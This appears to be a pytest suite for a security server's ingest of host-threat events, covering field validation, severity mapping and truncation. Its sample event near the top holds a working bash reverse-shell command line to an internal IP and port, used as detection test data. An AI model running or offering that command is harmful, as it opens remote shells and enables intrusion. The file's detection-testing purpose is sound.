"""Unit tests for host_threat event ingest validation and storage.

Requirements: 8.2, 8.5
"""

import json

import pytest

from app.host_ingest import validate_host_threat, store_host_threat, process_host_threat_events
from app.models import get_db
from server_tests.conftest import auth_header


# ── Valid host_threat event template ─────────────────────────────────────

VALID_HOST_EVENT = {
    "event_kind": "host_threat",
    "node_id": "agent-node-01",
    "hostname": "web-01",
    "timestamp": "2024-01-15T10:30:00.123Z",
    "event_type": "REVERSE_SHELL",
    "rule_name": "sigma_reverse_shell_bash",
    "pid": 12345,
    "ppid": 1000,
    "exe": "/bin/bash",
    "command_line": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "uid": 33,
    "auid": 33,
    "raw_line": "type=SYSCALL msg=audit(1705312200.123:456): arch=c000003e syscall=59 ...",
}


def _make_host_event(**overrides):
    """Return a copy of VALID_HOST_EVENT with overrides applied."""
    ev = dict(VALID_HOST_EVENT)
    ev.update(overrides)
    return ev


# ══════════════════════════════════════════════════════════════════════════
# validate_host_threat unit tests
# ══════════════════════════════════════════════════════════════════════════


class TestValidateHostThreat:
    """Tests for validate_host_threat()."""

    def test_valid_event_returns_no_errors(self):
        errors = validate_host_threat(VALID_HOST_EVENT)
        assert errors == []

    def test_missing_hostname(self):
        ev = _make_host_event()
        del ev["hostname"]
        errors = validate_host_threat(ev)
        assert any("hostname" in e for e in errors)

    def test_empty_hostname(self):
        ev = _make_host_event(hostname="")
        errors = validate_host_threat(ev)
        assert any("hostname" in e for e in errors)

    def test_missing_timestamp(self):
        ev = _make_host_event()
        del ev["timestamp"]
        errors = validate_host_threat(ev)
        assert any("timestamp" in e for e in errors)

    def test_missing_event_type(self):
        ev = _make_host_event()
        del ev["event_type"]
        errors = validate_host_threat(ev)
        assert any("event_type" in e for e in errors)

    def test_missing_rule_name(self):
        ev = _make_host_event()
        del ev["rule_name"]
        errors = validate_host_threat(ev)
        assert any("rule_name" in e for e in errors)

    def test_missing_pid(self):
        ev = _make_host_event()
        del ev["pid"]
        errors = validate_host_threat(ev)
        assert any("pid" in e for e in errors)

    def test_missing_raw_line(self):
        ev = _make_host_event()
        del ev["raw_line"]
        errors = validate_host_threat(ev)
        assert any("raw_line" in e for e in errors)

    def test_pid_non_integer(self):
        ev = _make_host_event(pid="not_a_number")
        errors = validate_host_threat(ev)
        assert any("pid must be an integer" in e for e in errors)

    def test_ppid_non_integer(self):
        ev = _make_host_event(ppid="abc")
        errors = validate_host_threat(ev)
        assert any("ppid must be an integer" in e for e in errors)

    def test_uid_non_integer(self):
        ev = _make_host_event(uid="xyz")
        errors = validate_host_threat(ev)
        assert any("uid must be an integer" in e for e in errors)

    def test_auid_non_integer(self):
        ev = _make_host_event(auid=[1, 2])
        errors = validate_host_threat(ev)
        assert any("auid must be an integer" in e for e in errors)

    def test_integer_as_string_is_accepted(self):
        """Integer fields given as string representations should pass."""
        ev = _make_host_event(pid="12345", ppid="1000", uid="33", auid="33")
        errors = validate_host_threat(ev)
        assert errors == []

    def test_multiple_missing_fields(self):
        ev = _make_host_event()
        del ev["hostname"]
        del ev["pid"]
        del ev["exe"]
        errors = validate_host_threat(ev)
        assert len(errors) >= 3

    def test_none_value_treated_as_missing(self):
        ev = _make_host_event(hostname=None)
        errors = validate_host_threat(ev)
        assert any("hostname" in e for e in errors)


# ══════════════════════════════════════════════════════════════════════════
# Integration tests via the API endpoint
# ══════════════════════════════════════════════════════════════════════════


class TestHostThreatIngestAPI:
    """Tests for host_threat ingestion through POST /api/v1/events."""

    def test_valid_host_threat_accepted(self, client, api_key, app):
        """A valid host_threat event is accepted and stored."""
        payload = {"events": [_make_host_event()]}
        resp = client.post(
            "/api/v1/events",
            data=json.dumps(payload),
            content_type="application/json",
            headers=auth_header(api_key),
        )
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["accepted"] == 1
        assert data["rejected"] == []
        assert data["total"] == 1

        # Verify it's in the host_events table
        db = get_db(app.config["DATABASE_PATH"])
        try:
            row = db.execute("SELECT * FROM host_events WHERE hostname = 'web-01'").fetchone()
            assert row is not None
            assert row["pid"] == 12345
            assert row["rule_name"] == "sigma_reverse_shell_bash"
        finally:
            db.close()

    def test_invalid_host_threat_rejected(self, client, api_key, app):
        """A host_threat event with missing fields is rejected."""
        ev = _make_host_event()
        del ev["hostname"]
        del ev["pid"]
        payload = {"events": [ev]}
        resp = client.post(
            "/api/v1/events",
            data=json.dumps(payload),
            content_type="application/json",
            headers=auth_header(api_key),
        )
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["accepted"] == 0
        assert len(data["rejected"]) == 1
        assert any("hostname" in e for e in data["rejected"][0]["errors"])
        assert any("pid" in e for e in data["rejected"][0]["errors"])

    def test_mixed_batch_host_and_regular(self, client, api_key, app):
        """A batch with both host_threat and regular events processes both."""
        regular_event = {
            "node_id": "test-node-1",
            "event_id": "evt-mixed-001",
            "timestamp": "2025-01-15T10:30:00Z",
            "source_ip": "192.168.1.100",
            "event_type": "BRUTE_FORCE",
            "action_taken": "BLOCKED",
            "geo_data": {"country": "US"},
            "metadata": {},
        }
        host_event = _make_host_event()
        payload = {"events": [regular_event, host_event]}
        resp = client.post(
            "/api/v1/events",
            data=json.dumps(payload),
            content_type="application/json",
            headers=auth_header(api_key),
        )
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["accepted"] == 2
        assert data["total"] == 2

    def test_non_integer_pid_rejected(self, client, api_key):
        """host_threat event with non-integer pid is rejected."""
        ev = _make_host_event(pid="not_an_int")
        payload = {"events": [ev]}
        resp = client.post(
            "/api/v1/events",
            data=json.dumps(payload),
            content_type="application/json",
            headers=auth_header(api_key),
        )
        data = resp.get_json()
        assert data["accepted"] == 0
        assert len(data["rejected"]) == 1
        assert any("pid must be an integer" in e for e in data["rejected"][0]["errors"])

    def test_severity_derived_from_metadata_severity_weight(self, client, api_key, app):
        """Agent events ship event_type='host_threat' at the top level and the
        real severity as a numeric weight in metadata; the stored event_type
        should reflect the derived severity name so scoring/alerting tiers work."""
        ev = _make_host_event(event_type="host_threat")
        ev["metadata"] = {
            "event_kind": "host_threat",
            "rule_name": ev["rule_name"],
            "severity_weight": 25,
            "hostname": ev["hostname"],
            "pid": ev["pid"],
            "ppid": ev["ppid"],
            "exe": ev["exe"],
            "command_line": ev["command_line"],
            "uid": ev["uid"],
            "auid": ev["auid"],
            "timestamp": ev["timestamp"],
        }
        payload = {"events": [ev]}
        resp = client.post(
            "/api/v1/events",
            data=json.dumps(payload),
            content_type="application/json",
            headers=auth_header(api_key),
        )
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["accepted"] == 1

        db = get_db(app.config["DATABASE_PATH"])
        try:
            row = db.execute("SELECT event_type FROM host_events ORDER BY id DESC LIMIT 1").fetchone()
            assert row["event_type"] == "high"
        finally:
            db.close()

    def test_severity_not_overridden_without_weight(self, client, api_key, app):
        """Events without a severity_weight keep their provided event_type."""
        ev = _make_host_event(event_type="REVERSE_SHELL")
        payload = {"events": [ev]}
        resp = client.post(
            "/api/v1/events",
            data=json.dumps(payload),
            content_type="application/json",
            headers=auth_header(api_key),
        )
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["accepted"] == 1

        db = get_db(app.config["DATABASE_PATH"])
        try:
            row = db.execute("SELECT event_type FROM host_events ORDER BY id DESC LIMIT 1").fetchone()
            assert row["event_type"] == "REVERSE_SHELL"
        finally:
            db.close()

    def test_event_kind_in_metadata_detected(self, client, api_key, app):
        """host_threat event_kind in metadata is correctly detected."""
        ev = _make_host_event()
        del ev["event_kind"]
        ev["metadata"] = {"event_kind": "host_threat"}
        payload = {"events": [ev]}
        resp = client.post(
            "/api/v1/events",
            data=json.dumps(payload),
            content_type="application/json",
            headers=auth_header(api_key),
        )
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["accepted"] == 1

    def test_exe_truncated_to_1024(self, client, api_key, app):
        """exe field is truncated to 1024 characters when stored."""
        long_exe = "/bin/" + "x" * 2000
        ev = _make_host_event(exe=long_exe)
        payload = {"events": [ev]}
        resp = client.post(
            "/api/v1/events",
            data=json.dumps(payload),
            content_type="application/json",
            headers=auth_header(api_key),
        )
        assert resp.status_code == 200

        db = get_db(app.config["DATABASE_PATH"])
        try:
            row = db.execute("SELECT exe FROM host_events ORDER BY id DESC LIMIT 1").fetchone()
            assert len(row["exe"]) == 1024
        finally:
            db.close()

    def test_command_line_truncated_to_32768(self, client, api_key, app):
        """command_line field is truncated to 32768 characters when stored."""
        long_cmd = "a" * 50000
        ev = _make_host_event(command_line=long_cmd)
        payload = {"events": [ev]}
        resp = client.post(
            "/api/v1/events",
            data=json.dumps(payload),
            content_type="application/json",
            headers=auth_header(api_key),
        )
        assert resp.status_code == 200

        db = get_db(app.config["DATABASE_PATH"])
        try:
            row = db.execute("SELECT command_line FROM host_events ORDER BY id DESC LIMIT 1").fetchone()
            assert len(row["command_line"]) == 32768
        finally:
            db.close()
